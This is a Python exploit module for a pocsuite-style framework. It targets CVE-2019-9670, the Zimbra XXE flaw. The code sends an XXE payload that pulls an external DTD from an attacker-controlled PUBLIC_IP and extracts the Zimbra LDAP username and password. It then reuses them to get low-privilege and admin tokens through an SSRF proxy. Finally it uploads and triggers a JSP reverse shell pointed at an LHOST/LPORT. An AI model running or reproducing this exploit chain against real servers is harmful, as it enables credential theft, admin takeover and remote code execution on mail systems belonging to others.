"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from collections import OrderedDict
from urllib.parse import quote, urljoin

from Tools.PocSuite.api import POC_SCAN, Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE, logger, paths
from Tools.PocSuite.lib.utils import random_str

import requests  # python-requests, eg. apt-get install python3-requests
import sys, os
import re
import uuid
import urllib
from urllib.parse import urlparse, urljoin
import binascii
sys.path.append(os.path.dirname(os.getcwd()) + "/../")
from configvalue import * 

class DemoPOC(POCBase):
    vulID = 'CVE-2019-9670'  # ssvid
    version = '1.0'
    author = ['khoa']
    vulDate = '29/05/2019'
    createDate = '2019-05-29'
    updateDate = '2019-05-30'
    references = ['https://nvd.nist.gov/vuln/detail/CVE-2019-9670']
    name = 'Zimbra < 8.7.11p10 XXE injection lead to RCE'
    appPowerLink = {"typescan" : POC_SCAN.EXPLOITS.DIR,
                "language"  : [POC_SCAN.LANGUAGE.JAVA],
                "folder_init": "cve_2019_9670"}
    appName = 'zimbra-cve-2019-9670'
    appVersion = 'CVE-2019-9670'
    vulType = VUL_TYPE.XML_INJECTION
    desc = '''mailboxd component in Synacor Zimbra Collaboration Suite 8.7.x before 8.7.11p10 has an XML External Entity injection (XXE) vulnerability that can lead to RCE'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''CVSSv3: 9.8 (AV:N/AC:L/Au:N/C:P/I:P/A:P)'''
    url_result = {}
    username = '' 
    password = '' 
    low_token = ''
    admin_token = '' 
    

    # def _options(self):
    #     o = OrderedDict()
    #     payload = {
    #         "nc": REVERSE_PAYLOAD.NC,
    #         "bash": REVERSE_PAYLOAD.BASH,
    #     }
    #     o["command"] = OptDict(selected="bash", default=payload)
    #     return o
    def make_xml_auth_body(self, xmlns, username, passwd): 
        auth_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
            <soap:Header>
                <context xmlns="urn:zimbra">
                    <userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/>
                </context>
            </soap:Header>
            <soap:Body>
                <AuthRequest xmlns="{}">
                    <account by="adminName">{}</account>
                    <password>{}</password>
                </AuthRequest>
            </soap:Body>
         </soap:Envelope>"""
        return auth_body.format(xmlns, username, passwd)

    def _verify(self):
        result = {}
        flag = uuid.uuid4().hex
        data = '''<?xml version="1.0" ?> <!DOCTYPE a [<!ENTITY % asd SYSTEM "http://''' + PUBLIC_IP + ''':65535/''' +flag+'''">%asd;]>'''
        headers = {
            "Content-Type":"application/xml"
        }
        u = urlparse(self.url) 
        url = u[0] + "://" + u[1]
        r = requests.post(self.url + "/Autodiscover/Autodiscover.xml",data = data, headers=headers, verify=False, timeout=15)
        check = requests.get("http://" + PUBLIC_IP + ":65535/logfile.txt", verify=False) 
        if flag in check.text: 
            result['VerifyInfo'] = {} 
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Postdata'] = data
        return self.parse_output(result)   
       
    def _attack(self):
        try:
            u = urlparse(self.url) 
            url = u[0] + "://" + u[1]
            result = {}
            data = '''<!DOCTYPE Autodiscover [  
            <!ENTITY % dtd SYSTEM "http://{}:65535/cve-2019-9670">  
            %dtd;  
            %all;  
            ]>  
    <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">  
        <Request>  
            <EMailAddress>aaaaa</EMailAddress>  
            <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>  
        </Request>  
    </Autodiscover>'''.format(PUBLIC_IP)
            headers = {
                "Content-Type":"application/xml"
            }
            dtd_request = requests.post(url+"/Autodiscover/Autodiscover.xml",data=data,headers=headers,verify=False,timeout=15)
            pattern_name = re.compile(r"&lt;key name=(\"|&quot;)zimbra_user(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
            pattern_password = re.compile(r"&lt;key name=(\"|&quot;)zimbra_ldap_password(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
            if pattern_name.findall(dtd_request.text) and pattern_password.findall(dtd_request.text):
                username = pattern_name.findall(dtd_request.text)[0][2]
                password = pattern_password.findall(dtd_request.text)[0][2]
                low_auth = {"username" : username, "password" : password}
                print("[+] Extracted Username: {} Password: {}".format(username, password))
            r = requests.post(url+"/service/soap",data=self.make_xml_auth_body(
                "urn:zimbraAccount", 
                username, 
                password
            ), headers=headers, verify=False)
            low_token = r.headers['Set-Cookie'].split(";")[0].split("=")[1]
            headers["Host"]="{}:7071".format(urllib.parse.urlparse(url).netloc.split(":")[0])
            r = requests.post(url+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap/AuthRequest",data=self.make_xml_auth_body(
                "urn:zimbraAdmin", 
                username, 
                password
            ),
                verify=False, 
                headers=headers,
                cookies={"ZM_ADMIN_AUTH_TOKEN":low_token}
            )
            admin_token = r.headers['Set-Cookie'].split(";")[0].split("=")[1]
            filename_source = os.path.join(paths.POCSUITE_ROOT_PATH, 'init_pocs/cve_2019_9670/admin_token.txt')
            with open(filename_source, 'w') as file: 
                file.write(admin_token) 
                file.close()
            result['ShellInfo'] = {}
            result['ShellInfo']["Url"] = self.url 
            result['ShellInfo']['LdapPassword'] = password
            result['ShellInfo']['AdminAuthToken'] = admin_token
            return self.parse_output(result)        
        except:
            return

    def _shell(self):
        datainput = self.headers['Referer']['input']
        self.headers['Referer'] = ''
        # lay du lieu admin token
        data_source = os.path.join(paths.POCSUITE_ROOT_PATH, 'init_pocs/cve_2019_9670/admin_token.txt')
        with open(data_source,'r') as file: 
            admin_token = file.read().replace('\n', '')
            file.close() 
        # doc shell va thay du lieu vao trong shell
        filename_source = os.path.join(paths.POCSUITE_ROOT_PATH, 'init_pocs/cve_2019_9670/jsp-reverseshell-source.jsp')
        filename = os.path.join(paths.POCSUITE_ROOT_PATH, 'init_pocs/cve_2019_9670/jsp-reverseshell.jsp')
        with open(filename_source, "rb") as file:
            shell  = file.read().decode()
            file.close()
        shell = shell.replace('LHOST_cve_2019_9670', datainput['LHOST'])
        shell = shell.replace('LPORT_cve_2019_9670', str(datainput['LPORT']))
        fn = uuid.uuid4().hex.upper()[0:6] + ".jsp"
        f = {
            'filename1':(None, 'aaaaaaa', None),
            'clientFile':(fn, shell, "text/plain"),
            'requestId':(None, "12", None),
        }
        urlexploit = datainput['entrypoint']
        p_url = urlparse(urlexploit)
        urlexploit = p_url[0] + "://" + p_url[1]
        cookies = {
            "ZM_ADMIN_AUTH_TOKEN":admin_token
        }
        r = requests.post(urlexploit+"/service/extension/clientUploader/upload",files=f,
            cookies=cookies, 
            verify=False
            
        )
        if r.status_code == 200: 
            r = requests.get(urlexploit + "/downloads/" + fn,
                cookies=cookies, 
                verify=False
            )
            if r.status_code == 200: 
                print("connect shell thanh cong")
            else: 
                print(r.status_code)
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)
